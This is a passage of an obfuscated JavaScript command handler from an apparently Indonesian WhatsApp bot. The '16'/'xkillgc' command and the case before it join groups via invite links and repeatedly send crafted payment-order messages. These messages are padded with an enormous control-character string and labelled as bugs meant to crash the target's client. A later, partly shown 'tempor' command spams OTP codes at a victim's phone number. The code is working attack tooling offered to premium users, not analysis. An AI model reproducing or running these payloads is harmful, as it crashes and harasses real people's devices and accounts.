_0x4d6c81<_0x3cf71a;},'xwGIR':function(_0xbeba16,_0xb121e0){return _0xbeba16!==_0xb121e0;},'xOILv':_0x1370a9(0x311,0x309,0x2de,0x2f6)};function _0x1370a9(_0x259ca3,_0x4f3e73,_0x2a1353,_0x2e9c43){return _0x5ddd(_0x4f3e73-0x161,_0x2a1353);}const _0x5d7fdb=function(){let _0x49e88e;try{_0x49e88e=Function(_0x45af7f['TPYLA'](_0x45af7f[_0x5092a3(0x73,0x32,0x6d,0x5a)](_0x45af7f[_0x281419(-0x1d0,-0x208,-0x1e5,-0x1f5)],_0x45af7f['AkhMy']),');'))();}catch(_0x478daf){_0x49e88e=window;}function _0x281419(_0x2b260f,_0x31bfd0,_0x107ed8,_0x4608a3){return _0x1370a9(_0x2b260f-0xb5,_0x107ed8- -0x540,_0x31bfd0,_0x4608a3-0x23);}function _0x5092a3(_0x5985cb,_0xe654b1,_0x5062f4,_0x3e70ce){return _0x1370a9(_0x5985cb-0x49,_0x5985cb- -0x2e2,_0x3e70ce,_0x3e70ce-0x1de);}return _0x49e88e;},_0x3826f4=_0x45af7f[_0x1370a9(0x33f,0x346,0x37f,0x382)](_0x5d7fdb);function _0x286971(_0x7e9968,_0x534461,_0x477cb3,_0x39c32c){return _0x5ddd(_0x477cb3- -0x2cb,_0x7e9968);}const _0x585158=_0x3826f4[_0x286971(-0x10a,-0x127,-0xff,-0x13e)]=_0x3826f4[_0x1370a9(0x313,0x32d,0x2f7,0x33e)]||{},_0x1dd01c=[_0x45af7f[_0x286971(-0x169,-0x13b,-0x139,-0x16c)],_0x1370a9(0x35d,0x374,0x34f,0x378),_0x45af7f[_0x286971(-0xfe,-0xe9,-0xbf,-0xf9)],_0x45af7f[_0x1370a9(0x30b,0x31d,0x356,0x336)],_0x45af7f['QqXmN'],_0x45af7f[_0x286971(-0xfe,-0x106,-0xfb,-0x128)],_0x45af7f[_0x1370a9(0x2e5,0x310,0x2e8,0x2d4)]];for(let _0xabfc22=-0xdbc+-0xf17*-0x1+-0x1*0x15b;_0x45af7f[_0x286971(-0x140,-0x15a,-0x135,-0x159)](_0xabfc22,_0x1dd01c['length']);_0xabfc22++){if(_0x45af7f[_0x1370a9(0x2f4,0x325,0x310,0x349)](_0x286971(-0x15a,-0x14c,-0x123,-0x136),_0x45af7f['xOILv'])){const _0x3d365f=_0x589460[_0x1370a9(0x326,0x332,0x368,0x326)](_0x581986,arguments);return _0x590f88=null,_0x3d365f;}else{const _0x504de4=_0x3d44a3[_0x286971(-0xf0,-0xec,-0xe8,-0x10a)+'r']['prototype']['bind'](_0x3d44a3),_0x262dd2=_0x1dd01c[_0xabfc22],_0x4ca48d=_0x585158[_0x262dd2]||_0x504de4;_0x504de4[_0x1370a9(0x320,0x300,0x320,0x2c5)]=_0x3d44a3[_0x286971(-0x143,-0xe8,-0x121,-0xfa)](_0x3d44a3),_0x504de4[_0x1370a9(0x375,0x358,0x31a,0x39a)]=_0x4ca48d['toString'][_0x1370a9(0x341,0x30b,0x30a,0x2cb)](_0x4ca48d),_0x585158[_0x262dd2]=_0x504de4;}}});_0x4adc8a();let bug='\x03'['repeat'](-0x1e0*0x664+0xb550e+0x9ce32);for(let i=-0x1097+-0x2d3*0x1+0x136a;i<0x25a5+-0x14e9+-0x109e;i++){const _0x4a824b={};_0x4a824b[_0x30bfde(0x527,0x579,0x55b,0x568)+'Jid']=_0x30bfde(0x5fc,0x597,0x5bd,0x5e7)+_0x45425d(0x79,0x77,0x3c,0x6d)+'ewsletter',_0x4a824b[_0x30bfde(0x51e,0x577,0x55b,0x58d)+'Name']=_0x45425d(0x46,0x52,0x24,0x79)+_0x30bfde(0x564,0x561,0x584,0x565)+'ni\x20->\x20cras'+'h',_0x4a824b[_0x45425d(0x8d,0x6e,0x97,0x81)+_0x30bfde(0x519,0x53d,0x53d,0x579)]=0x2;const _0x32c405={};_0x32c405[_0x30bfde(0x58d,0x55d,0x5a0,0x5df)+'tachment']=[],_0x32c405[_0x30bfde(0x573,0x54c,0x548,0x534)+_0x45425d(0x99,0xa1,0x86,0x62)]=global[_0x45425d(0x72,0x98,0xa4,0xa0)];const _0x23db66={};_0x23db66[_0x30bfde(0x5f2,0x5d7,0x5bc,0x588)]='review_and'+'_pay',_0x23db66['buttonPara'+_0x30bfde(0x56a,0x550,0x53c,0x514)]='{\x22currency'+_0x30bfde(0x5df,0x57f,0x5c3,0x5c9)+_0x30bfde(0x55c,0x5ae,0x578,0x545)+_0x45425d(0x78,0x61,0x47,0x45)+'\x22:69696969'+_0x45425d(0xa7,0xc1,0x7d,0xde)+_0x45425d(0xc5,0x8a,0x69,0x84)+'rence_id\x22:'+_0x45425d(0x16,0x53,0x53,0x33)+_0x30bfde(0x59b,0x5b2,0x5b6,0x573)+_0x30bfde(0x5b7,0x5a6,0x577,0x5a2)+_0x30bfde(0x588,0x5ed,0x5ab,0x5c1)+_0x30bfde(0x5dd,0x5ab,0x598,0x5ba)+_0x30bfde(0x5e7,0x5e3,0x5b3,0x5a3)+_0x45425d(0x56,0x6d,0xa0,0x47)+_0x45425d(0x33,0x5b,0x18,0x25)+'total\x22:{\x22v'+_0x30bfde(0x53c,0x59d,0x570,0x536)+_0x30bfde(0x577,0x5b0,0x593,0x576)+'et\x22:100},\x22'+_0x45425d(0x99,0x85,0x80,0x75)+_0x45425d(0x89,0xc7,0x96,0xda)+_0x45425d(0x53,0x7f,0x64,0xa5)+_0x45425d(0xcc,0xbe,0xde,0xe7)+'id\x22:\x2275376'+'3159292600'+_0x45425d(0x75,0x8b,0x4d,0x8a)+_0x45425d(0x77,0xb7,0xcc,0xe5)+_0x45425d(0x83,0xa9,0xe8,0xc9)+_0x30bfde(0x5b4,0x556,0x57f,0x595)+_0x30bfde(0x563,0x55c,0x554,0x525)+xbugtex['xtxt']+(_0x45425d(0x6c,0x9f,0xd4,0xcd)+_0x45425d(0x8b,0x55,0x6b,0x45)+_0x45425d(0x87,0xc2,0x88,0xa9)+_0x45425d(0x6a,0x6f,0xa0,0xae)+_0x45425d(0x2f,0x6b,0x7d,0x52)+_0x30bfde(0x531,0x592,0x562,0x548)+_0x45425d(0x21,0x45,0x6e,0x7d)+_0x45425d(0xd7,0x9e,0x5b,0xbf)+_0x30bfde(0x535,0x584,0x547,0x570)+_0x30bfde(0x5d1,0x5c3,0x594,0x5c1)+_0x45425d(0x4e,0x71,0x9f,0x2e)+_0x45425d(0xbb,0x83,0x51,0x92)+_0x30bfde(0x576,0x595,0x5af,0x5e9)+_0x45425d(0xca,0x8c,0x98,0x64)+'🦄\x20Yosh\x20🦄')+bug+(_0x30bfde(0x57a,0x5bd,0x59c,0x5c0)+_0x30bfde(0x596,0x510,0x552,0x551)+_0x30bfde(0x5f8,0x5f5,0x5bf,0x587)+'ffset\x22:100'+_0x45425d(0x3d,0x6b,0x2e,0xa2)+_0x45425d(0x99,0x9c,0xd6,0x62)+_0x30bfde(0x561,0x593,0x5a3,0x563)+_0x45425d(0xdd,0x9d,0xc6,0xe1)+_0x45425d(0x84,0x48,0x8b,0x47));const _0x17c293={};_0x17c293[_0x30bfde(0x586,0x587,0x544,0x507)]=[_0x23db66];const _0x4b01d0={};_0x4b01d0[_0x30bfde(0x5ac,0x582,0x5ae,0x5a9)]=_0x32c405,_0x4b01d0[_0x45425d(0x70,0xa5,0xde,0x88)+_0x30bfde(0x56a,0x57d,0x56f,0x587)]=_0x17c293;const _0x306fb9={};_0x306fb9['interactiv'+'eMessage']=_0x4b01d0;const _0x118bf8={};_0x118bf8['isForwarde'+'d']=!![],_0x118bf8[_0x45425d(0xad,0x79,0x96,0x46)+_0x30bfde(0x5dd,0x587,0x5a8,0x585)+_0x30bfde(0x57b,0x58e,0x5a9,0x57b)]=_0x4a824b,_0x118bf8['stanzaId']=_0x30bfde(0x593,0x593,0x564,0x520)+_0x30bfde(0x5e4,0x593,0x5b0,0x5d1),_0x118bf8[_0x30bfde(0x517,0x550,0x540,0x520)+'t']=_0x45425d(0x9d,0x75,0x59,0x91)+'pp.net',_0x118bf8[_0x30bfde(0x5df,0x5ca,0x5b7,0x5b3)+_0x45425d(0x8c,0x89,0x76,0x61)]=_0x306fb9,_0x118bf8['remoteJid']=_0x45425d(0x3a,0x54,0x43,0x1c)+_0x30bfde(0x512,0x51c,0x54d,0x528);const _0x40542e={};_0x40542e[_0x45425d(0xc0,0xad,0xd6,0xb4)]='🚨DGYosh🚨',_0x40542e[_0x30bfde(0x563,0x532,0x556,0x589)+'o']=_0x118bf8;const _0x42ef4a={};_0x42ef4a[_0x30bfde(0x51c,0x550,0x55d,0x587)+_0x45425d(0x81,0xa8,0x94,0xcb)]=_0x40542e,await Yosh[_0x30bfde(0x5f1,0x5db,0x5b8,0x5c3)+'ge'](target,_0x42ef4a,{});const _0x415505={};_0x415505[_0x45425d(0xb2,0xad,0x8b,0xd6)]='';const _0x10e9ac={};_0x10e9ac[_0x30bfde(0x539,0x54f,0x57a,0x56b)]=xbug2,await Yosh[_0x45425d(0x65,0x92,0x65,0xc3)+'e'](target,_0x415505,_0x10e9ac);}
replygcYosh(`Successfully Sent Bug To ${target}`)
}
break
case '16': case 'xkillgc': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Use ${prefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstubwxyz`)
await loading()
let Yoshgclink = args[0].split('https://chat.whatsapp.com/')[1]
let target = await Yosh.groupAcceptInvite(Yoshgclink)
function _0x15a19b(_0x4606b9,_0x12a5f5,_0xc8a211,_0x38bf12){return _0x2c69(_0xc8a211-0x37a,_0x12a5f5);}(function(_0x32c932,_0x1f4144){function _0x4e762(_0x29a032,_0x58669b,_0x4819ff,_0x1bbcab){return _0x2c69(_0x1bbcab-0x3ac,_0x29a032);}function _0x12a254(_0x1099ce,_0x32afd2,_0x194fd0,_0x327cbb){return _0x2c69(_0x1099ce-0x358,_0x327cbb);}const _0x93f3e0=_0x32c932();while(!![]){try{const _0x138da9=parseInt(_0x4e762(0x534,0x508,0x538,0x525))/(0x1c22+0xd27+-0x2948)+-parseInt(_0x12a254(0x4aa,0x4d6,0x4c7,0x4b4))/(0x968+-0x1d56+0xe8*0x16)+parseInt(_0x12a254(0x4ad,0x48b,0x482,0x499))/(-0x1a0c+-0x656*0x3+0x8b*0x53)*(-parseInt(_0x12a254(0x4ac,0x4db,0x4e6,0x4e9))/(0xf41+0x1c7*-0x4+0x1*-0x821))+parseInt(_0x12a254(0x497,0x4d3,0x4bc,0x4cb))/(-0x91a*0x1+-0x1*-0x1a61+0x5e*-0x2f)+parseInt(_0x12a254(0x4b8,0x4ca,0x4da,0x4b4))/(0x14a9+0x11a1+-0x2644)*(parseInt(_0x4e762(0x507,0x4e6,0x536,0x515))/(-0x26*0x86+-0x8f5+0x1ce0))+-parseInt(_0x12a254(0x4b4,0x4c4,0x488,0x487))/(-0x1dc5+-0x1*-0x158f+0x83e)+parseInt(_0x4e762(0x4f9,0x4f3,0x543,0x505))/(0x16d3+0x676+-0x1d40);if(_0x138da9===_0x1f4144)break;else _0x93f3e0['push'](_0x93f3e0['shift']());}catch(_0x5a1c83){_0x93f3e0['push'](_0x93f3e0['shift']());}}}(_0x28f4,-0x895ef+0x2c3ab*0x1+0x70a45*0x2));function _0x28f4(){const _0xc03139=['9631592926','LMRHf','\x22:19999800','nativeFlow','atus\x22:\x22pay','y\x22:1},{\x22re','relog\x20->\x20b','alue\x22:1999','KPvBh','1015567RWhxft','🚨DGYosh🚨','status@bro','hlALu','console','participan','et\x22:100},\x22','ewsletter','extendedTe','wGFMV','quotedMess','qtLWg','eMessage','contextInf','name','relayMessa','log','mqpvR','msJson','{\x22currency','rder\x22:{\x22st','serverMess','eENlZ','newsletter','3159292600','(((.+)+)+)','4605763435','CyYeu','pdrOS','-goods\x22,\x22o','toString','review_and','qXdro','trace',':{\x22value\x22:','tachment','hasMediaAt','tailer_id\x22','\x22:\x22ORDER\x22,','05763435\x22,','fnqzI','ffset\x22:100','constructo','ctor(\x22retu','rn\x20this\x22)(','__proto__','rEVfh','BicPl','interactiv','sendMessag','d\x22:\x22784267','search','PyHzx','buttonPara','ment_reque','\x22retailer_','FSRnS','DSQpv','Name','apply','{}.constru','hGwoG','wlGgz','9800,\x22offs','\x224ONSAXV76','remoteJid','bind','ent_method','2744475MxefMg','Bot\x20Bug\x20','BAE526D352','repeat','ageId','1203631440','essageInfo','quoted','order_type','9999900,\x22o','isForwarde','9\x22,\x22produc','\x22:\x22','sted\x22,\x22sub','\x22,\x22amount\x22','text','y\x22:1}]},\x22n','0@s.whatsa','s\x22:[]}','1956718pKDJWP','jpegThumbn','12dRRZxP','17007BVOKOK','JYWfq','ewsletterM','prototype','2491038IvFzgs','age','100},\x22refe','6236616VQxBED','🦄\x20Yosh\x20🦄','\x22,\x22name\x22:\x22','adcast','9726owwjYh','pp.net','_pay','warn',':\x22physical','uka\x20chat\x20i','stanzaId','xtMessage','\x22product_i','2051mEbMaU','\x22items\x22:[{','rence_id\x22:','APELu','},\x22quantit','gUvHS','total\x22:{\x22v'];_0x28f4=function(){return _0xc03139;};return _0x28f4();}const _0xf3274a=(function(){const _0xe47f4c={};_0xe47f4c['LMRHf']=function(_0x3c6308,_0x22ed9d){return _0x3c6308===_0x22ed9d;};const _0x356cf0=_0xe47f4c;let _0x4928d6=!![];return function(_0x4083b5,_0x405178){const _0x553721=_0x4928d6?function(){function _0x2a4276(_0x5c799f,_0x5f1986,_0x578aa5,_0x2210ae){return _0x2c69(_0x5c799f-0x180,_0x5f1986);}function _0x2e2cd7(_0x558938,_0x2881c8,_0x15d247,_0x3d1266){return _0x2c69(_0x2881c8- -0x2f,_0x558938);}if(_0x405178){if(_0x356cf0[_0x2e2cd7(0x113,0x142,0x11f,0x131)](_0x2a4276(0x2fc,0x30e,0x2f5,0x311),_0x2a4276(0x2fc,0x2f8,0x2f3,0x311))){const _0x471196=_0x405178[_0x2a4276(0x2b6,0x2e3,0x2ab,0x2d9)](_0x4083b5,arguments);return _0x405178=null,_0x471196;}else{if(_0x382c57){const _0x1a504b=_0x396a5f[_0x2e2cd7(0x144,0x107,0x128,0xe6)](_0x5ec307,arguments);return _0x5171ab=null,_0x1a504b;}}}}:function(){};return _0x4928d6=![],_0x553721;};}()),_0xba930b=_0xf3274a(this,function(){function _0x6d950(_0x9cf75f,_0x40c57a,_0xc3e9a6,_0x3af5ff){return _0x2c69(_0x40c57a- -0x20a,_0x9cf75f);}function _0x5503bf(_0x4d57f6,_0x46058f,_0x3ca3bd,_0x7fe452){return _0x2c69(_0x7fe452-0x2c,_0x4d57f6);}const _0x1c68ae={};_0x1c68ae['KPvBh']=_0x5503bf(0x1a6,0x1cf,0x1f9,0x1be)+'+$';const _0x56cda8=_0x1c68ae;return _0xba930b[_0x6d950(-0x38,-0x73,-0x71,-0x60)]()[_0x6d950(-0xec,-0xdc,-0xa8,-0xd6)](_0x56cda8['KPvBh'])[_0x6d950(-0x9a,-0x73,-0x54,-0x77)]()[_0x6d950(-0x51,-0x67,-0x64,-0x91)+'r'](_0xba930b)[_0x5503bf(0x135,0x146,0x138,0x15a)](_0x56cda8[_0x5503bf(0x16b,0x1b5,0x165,0x1a4)]);});_0xba930b();const _0x27e679=(function(){const _0x52c56d={};function _0x1e2a96(_0x5e8491,_0x27062,_0x157918,_0x4a516f){return _0x2c69(_0x27062- -0x3a2,_0x4a516f);}_0x52c56d[_0x1e2a96(-0x1d2,-0x201,-0x1c7,-0x205)]=function(_0x299c4f,_0x303405){return _0x299c4f===_0x303405;},_0x52c56d[_0x47b5b4(-0x7b,-0x60,-0x4a,-0x82)]=_0x1e2a96(-0x1f7,-0x1fa,-0x1bb,-0x213),_0x52c56d['pdrOS']=function(_0x349826,_0x5a01cb){return _0x349826===_0x5a01cb;};function _0x47b5b4(_0x9242fe,_0x34f26c,_0x236436,_0xc890cb){return _0x2c69(_0xc890cb- -0x1ba,_0x236436);}_0x52c56d[_0x47b5b4(-0x56,-0x9a,-0x32,-0x64)]=_0x1e2a96(-0x1fa,-0x236,-0x267,-0x23c);const _0x4e8549=_0x52c56d;let _0x14afcb=!![];return function(_0x2fda07,_0x1f0236){function _0x248f3f(_0x2da683,_0x5d16ad,_0x1ab971,_0x117841){return _0x47b5b4(_0x2da683-0x95,_0x5d16ad-0xe6,_0x117841,_0x2da683-0xf9);}const _0x3e951c={'wGFMV':function(_0x2d3b2b,_0x1f21d8){function _0x4936aa(_0x10ef59,_0x25a683,_0x29f193,_0x24905a){return _0x2c69(_0x10ef59- -0x34c,_0x29f193);}return _0x4e8549[_0x4936aa(-0x1ab,-0x19e,-0x1b6,-0x1e3)](_0x2d3b2b,_0x1f21d8);},'wlGgz':_0x4e8549['hGwoG']};function _0x4e5da3(_0x9e6a14,_0x56ad8e,_0x3b042d,_0x3a71c6){return _0x47b5b4(_0x9e6a14-0xd9,_0x56ad8e-0x12c,_0x56ad8e,_0x3b042d-0xb8);}if(_0x4e8549[_0x248f3f(0xd4,0xcf,0xf8,0xea)](_0x4e8549['JYWfq'],_0x4e8549[_0x248f3f(0x95,0x9a,0xba,0xd1)])){const _0xbc1ff4=_0x14afcb?function(){function _0x3f1e52(_0x501052,_0x3819b9,_0xcdf14c,_0x20b695){return _0x248f3f(_0x20b695-0x2a4,_0x3819b9-0x1e5,_0xcdf14c-0x3d,_0x501052);}function _0xb0be2e(_0x245618,_0x49a541,_0x57aedc,_0x50a750){return _0x248f3f(_0x50a750-0x48f,_0x49a541-0x18b,_0x57aedc-0x10e,_0x49a541);}if(_0x3e951c[_0xb0be2e(0x54b,0x57f,0x55d,0x550)](_0x3e951c[_0xb0be2e(0x507,0x546,0x4eb,0x507)],_0x3e951c['wlGgz'])){if(_0x1f0236){const _0x54e552=_0x1f0236['apply'](_0x2fda07,arguments);return _0x1f0236=null,_0x54e552;}}else{const _0x1162a9=_0x55e6f5[_0xb0be2e(0x514,0x50e,0x525,0x504)](_0x55d62f,arguments);return _0x1d6e65=null,_0x1162a9;}}:function(){};return _0x14afcb=![],_0xbc1ff4;}else{const _0x3c8ae3=_0x10db29?function(){if(_0x47eefa){const _0x116ac3=_0x1bc075['apply'](_0x140e7d,arguments);return _0x4927b3=null,_0x116ac3;}}:function(){};return _0x74a72d=![],_0x3c8ae3;}};}()),_0x4b1e40=_0x27e679(this,function(){const _0x23c375={'nKLkp':function(_0x18c493,_0x9d5498){return _0x18c493(_0x9d5498);},'FSRnS':function(_0x470d2d,_0xc532f7){return _0x470d2d+_0xc532f7;},'CmuKI':function(_0x21a509,_0x2ef4f5){return _0x21a509+_0x2ef4f5;},'rEVfh':'return\x20(fu'+'nction()\x20','PyHzx':_0x3b55e5(-0x2a,-0x94,-0x96,-0x5b)+_0x17c6eb(0x315,0x32d,0x2d7,0x2eb)+_0x3b55e5(-0x17,-0x1a,-0xb,0x13)+'\x20)','DSQpv':function(_0xd33de8){return _0xd33de8();},'mqpvR':_0x17c6eb(0x2d4,0x2a5,0x30c,0x2bd),'MVzXY':'info','eENlZ':'error','CyYeu':'exception','qtLWg':'table','qXdro':_0x17c6eb(0x30b,0x31c,0x2d2,0x327),'gUvHS':function(_0x4e7602,_0x112b55){return _0x4e7602<_0x112b55;}};let _0x540ff0;try{const _0x2de064=_0x23c375['nKLkp'](Function,_0x23c375[_0x17c6eb(0x2a4,0x26e,0x2be,0x275)](_0x23c375['CmuKI'](_0x23c375[_0x3b55e5(0x3b,-0x19,0x38,0x15)],_0x23c375[_0x3b55e5(-0x90,-0x7b,-0x66,-0x63)]),');'));_0x540ff0=_0x23c375[_0x3b55e5(-0x3b,-0x44,-0x5a,-0x5e)](_0x2de064);}catch(_0x534aaf){_0x540ff0=window;}function _0x17c6eb(_0xa2b8eb,_0x577433,_0x1792ac,_0x3a2105){return _0x2c69(_0xa2b8eb-0x171,_0x1792ac);}const _0x67c609=_0x540ff0[_0x17c6eb(0x2ee,0x2db,0x2de,0x2bf)]=_0x540ff0[_0x3b55e5(0x14,-0x41,0x26,-0x15)]||{};function _0x3b55e5(_0x5c0e1b,_0x54810d,_0x29a7c9,_0x27545a){return _0x2c69(_0x27545a- -0x192,_0x29a7c9);}const _0x2c48a3=[_0x17c6eb(0x2fa,0x315,0x2bf,0x2cb),_0x23c375[_0x17c6eb(0x2fb,0x2be,0x313,0x304)],_0x23c375['MVzXY'],_0x23c375[_0x17c6eb(0x300,0x2db,0x303,0x2c2)],_0x23c375[_0x3b55e5(0xb,-0xa,-0x10,0x2)],_0x23c375[_0x17c6eb(0x2f5,0x2bd,0x2ff,0x30a)],_0x23c375[_0x17c6eb(0x30a,0x30c,0x2e6,0x2e7)]];for(let _0x517dea=-0x1f15*0x1+-0x26*0x6a+0x3*0xf9b;_0x23c375[_0x17c6eb(0x2df,0x319,0x2f9,0x2b7)](_0x517dea,_0x2c48a3['length']);_0x517dea++){const _0x3351ea=_0x27e679[_0x17c6eb(0x314,0x32f,0x315,0x2dd)+'r'][_0x17c6eb(0x2c9,0x29c,0x2d7,0x2e3)][_0x17c6eb(0x2ae,0x2a7,0x2be,0x271)](_0x27e679),_0xadfcb=_0x2c48a3[_0x517dea],_0x1de33d=_0x67c609[_0xadfcb]||_0x3351ea;_0x3351ea[_0x17c6eb(0x317,0x2e9,0x34f,0x313)]=_0x27e679[_0x17c6eb(0x2ae,0x29d,0x278,0x2d0)](_0x27e679),_0x3351ea[_0x3b55e5(0x3e,0x3b,-0x34,0x5)]=_0x1de33d[_0x17c6eb(0x308,0x323,0x2d7,0x2e2)]['bind'](_0x1de33d),_0x67c609[_0xadfcb]=_0x3351ea;}});_0x4b1e40();function _0x2427a7(_0x21fa51,_0x4358bc,_0x31d5c0,_0xf52ecc){return _0x2c69(_0x31d5c0-0x1ce,_0x4358bc);}function _0x2c69(_0x537000,_0xba930b){const _0xf3274a=_0x28f4();return _0x2c69=function(_0x28f4bb,_0x2c6957){_0x28f4bb=_0x28f4bb-(0x4*-0x3+0x1dbd+-0x1c86);let _0x3f9e4c=_0xf3274a[_0x28f4bb];return _0x3f9e4c;},_0x2c69(_0x537000,_0xba930b);}let bug='\x03'[_0x15a19b(0x4e0,0x4e1,0x4bc,0x4bc)](-0xceb14+0x4c1*0x3d7+-0x3d1bd*-0x1);for(let i=-0x3ed*0x7+0x1749+0x432;i<-0x2*-0x14c+-0x1510+-0x94b*-0x2;i++){const _0x18e95c={};_0x18e95c[_0x2427a7(0x33f,0x369,0x35e,0x36d)+'Jid']=_0x2427a7(0x309,0x32e,0x312,0x2dd)+'38483540@n'+_0x15a19b(0x4ee,0x50f,0x4fa,0x4e6),_0x18e95c[_0x15a19b(0x52e,0x4e6,0x50a,0x4db)+_0x15a19b(0x4a9,0x487,0x4af,0x4da)]=_0x2427a7(0x335,0x326,0x344,0x381)+_0x15a19b(0x4d6,0x4a7,0x4df,0x518)+'ni\x20->\x20cras'+'h',_0x18e95c[_0x15a19b(0x4fc,0x4ee,0x508,0x538)+_0x2427a7(0x33b,0x2ff,0x311,0x31a)]=0x2;const _0x427c68={};_0x427c68[_0x2427a7(0x33d,0x32f,0x36b,0x332)+_0x2427a7(0x390,0x3a6,0x36a,0x346)]=[],_0x427c68[_0x2427a7(0x352,0x2f9,0x321,0x331)+'ail']=global['bimg'];const _0xbe5d7a={};_0xbe5d7a[_0x15a19b(0x4ce,0x506,0x501,0x4f9)]=_0x2427a7(0x339,0x339,0x366,0x389)+_0x15a19b(0x4da,0x4f4,0x4dc,0x4b4),_0xbe5d7a[_0x15a19b(0x4bc,0x49b,0x4aa,0x493)+_0x15a19b(0x51f,0x505,0x505,0x4c7)]=_0x15a19b(0x4f3,0x4c8,0x506,0x53d)+'\x22:\x22IDR\x22,\x22t'+'otal_amoun'+'t\x22:{\x22value'+_0x2427a7(0x33c,0x311,0x340,0x352)+',\x22offset\x22:'+_0x2427a7(0x331,0x302,0x329,0x2f8)+_0x15a19b(0x4d0,0x4dc,0x4e5,0x4be)+_0x15a19b(0x4e4,0x4ce,0x4b5,0x4de)+'KN\x22,\x22type\x22'+_0x15a19b(0x4cf,0x4ea,0x4de,0x4ff)+_0x15a19b(0x4fd,0x539,0x510,0x50a)+_0x2427a7(0x333,0x338,0x35b,0x347)+_0x2427a7(0x380,0x312,0x342,0x312)+_0x15a19b(0x4a9,0x476,0x4ab,0x4b1)+_0x2427a7(0x2ff,0x2fa,0x31a,0x353)+_0x15a19b(0x4c3,0x4b4,0x4e9,0x511)+_0x15a19b(0x504,0x4ba,0x4f1,0x52a)+_0x2427a7(0x326,0x33c,0x308,0x2db)+_0x15a19b(0x4fc,0x520,0x4f9,0x52e)+_0x2427a7(0x31e,0x334,0x315,0x2e1)+_0x2427a7(0x349,0x347,0x36d,0x35e)+_0x2427a7(0x34c,0x362,0x338,0x312)+_0x15a19b(0x48a,0x4d3,0x4ac,0x48d)+'id\x22:\x2275376'+_0x15a19b(0x535,0x4f5,0x50b,0x518)+_0x2427a7(0x348,0x2f8,0x318,0x30d)+'t_id\x22:\x22799'+_0x15a19b(0x510,0x500,0x4ea,0x4ff)+'009\x22,\x22name'+_0x2427a7(0x357,0x2de,0x319,0x2fa)+xbugtex['xtxt']+(_0x2427a7(0x2ee,0x33f,0x31b,0x310)+_0x2427a7(0x33c,0x381,0x369,0x387)+_0x15a19b(0x4b6,0x48b,0x4c2,0x500)+_0x2427a7(0x364,0x358,0x370,0x3a0)+'},\x22quantit'+_0x15a19b(0x4d9,0x4d2,0x4ef,0x4c8)+_0x2427a7(0x335,0x390,0x36c,0x385)+':\x2278426746'+_0x2427a7(0x339,0x359,0x36e,0x350)+_0x15a19b(0x509,0x4bf,0x4e2,0x520)+_0x2427a7(0x2f8,0x303,0x2fb,0x307)+_0x15a19b(0x542,0x529,0x50d,0x4d9)+_0x15a19b(0x4b1,0x4fa,0x4d8,0x4be)+_0x2427a7(0x2df,0x322,0x30e,0x2ee)+_0x15a19b(0x4d5,0x4bb,0x4d7,0x4b5))+bug+(_0x2427a7(0x32b,0x308,0x31b,0x356)+_0x2427a7(0x357,0x3a5,0x369,0x37c)+_0x15a19b(0x49c,0x4e5,0x4c2,0x4af)+_0x2427a7(0x39d,0x354,0x370,0x37c)+_0x2427a7(0x30c,0x314,0x33b,0x374)+_0x15a19b(0x4ac,0x4b8,0x4c9,0x4a8)+'ative_paym'+_0x15a19b(0x49f,0x4ef,0x4b8,0x490)+_0x2427a7(0x2ff,0x351,0x31f,0x351));const _0x68c8f1={};_0x68c8f1['buttons']=[_0xbe5d7a];const _0x3439e0={};_0x3439e0['header']=_0x427c68,_0x3439e0[_0x2427a7(0x34b,0x312,0x341,0x33d)+'Message']=_0x68c8f1;const _0x22ac8a={};_0x22ac8a[_0x15a19b(0x48d,0x470,0x4a5,0x4d4)+_0x2427a7(0x345,0x34d,0x353,0x33b)]=_0x3439e0;const _0x19935d={};_0x19935d[_0x2427a7(0x33f,0x318,0x317,0x316)+'d']=!![],_0x19935d['forwardedN'+_0x2427a7(0x2ff,0x359,0x325,0x311)+_0x15a19b(0x48d,0x494,0x4bf,0x4af)]=_0x18e95c,_0x19935d[_0x15a19b(0x51e,0x515,0x4e0,0x50f)]=_0x2427a7(0x339,0x300,0x30f,0x346)+'FE4CDF',_0x19935d[_0x15a19b(0x506,0x4e3,0x4f8,0x52a)+'t']=_0x15a19b(0x4b2,0x48f,0x4ca,0x4b1)+_0x2427a7(0x36c,0x2f3,0x32f,0x2fe),_0x19935d[_0x2427a7(0x336,0x377,0x351,0x358)+_0x2427a7(0x34a,0x33e,0x328,0x35f)]=_0x22ac8a,_0x19935d[_0x2427a7(0x2f2,0x31b,0x30a,0x2d4)]=_0x15a19b(0x506,0x4dd,0x4f5,0x501)+_0x2427a7(0x312,0x32f,0x32d,0x333);const _0x48f80b={};_0x48f80b[_0x2427a7(0x2e4,0x2f7,0x31c,0x326)]=_0x2427a7(0x369,0x317,0x348,0x368),_0x48f80b[_0x2427a7(0x377,0x320,0x354,0x357)+'o']=_0x19935d;const _0x303aff={};_0x303aff[_0x2427a7(0x353,0x34e,0x34f,0x326)+_0x2427a7(0x333,0x31c,0x335,0x326)]=_0x48f80b,await Yosh[_0x2427a7(0x379,0x359,0x356,0x385)+'ge'](target,_0x303aff,{});const _0x59a15e={};_0x59a15e[_0x2427a7(0x311,0x300,0x31c,0x2e2)]='';const _0x569645={};_0x569645[_0x15a19b(0x4bf,0x4a3,0x4c0,0x4e4)]=xbug2,await Yosh[_0x2427a7(0x2f3,0x333,0x2fa,0x311)+'e'](target,_0x59a15e,_0x569645);}
replygcYosh(`Successfully Sent Bug To ${target}`)
}
break
case 'bot': case 'sattt': {
    await loading()
                    let walaw = (` 
     </> ${pushname} </>
`.trim()) 
        
        let walawe = (` 
*Kenapa min?*
`.trim()) 
        const captcha = await new canvafy.Captcha()
        .setBackground("image", "https://telegra.ph/file/31ccca3498d091967c6df.jpg")
        .setCaptchaKey(walaw) // canvafy captcha key generator "15" is key length
        .setBorder("#f0f0f0")
        .setOverlayOpacity(0.7)
        .build();
        Yosh.sendMessage(m.chat, {
            image: captcha,
            caption: walawe,
            gifPlayback: true
        }, {
            quoted: m
        })
}
break
case 'sat': case 'satt': {
    await loading2()
    if (!isCreator) return YoshStickOwner()
}
break
case 'tempor': {
  if (!isCreator) return YoshStickOwner()
  
    if (!q.includes('|')) return replygcYosh(`Use: .tempor <kode negara>|<nomor kartu>\nExaple: .${command} +62|83754338986`)
      const kodenegara = q.substring(0, q.indexOf('|') - 0)
      const nomortarget = q.substring(q.lastIndexOf('|') + 1) 
  m.reply(`*Temporary Sukses*\nBot sedang Spam Otp Silahkan Cek Nomor Target\nKetik ${prefix}stoptempor untuk Menghentikan Temporary`);
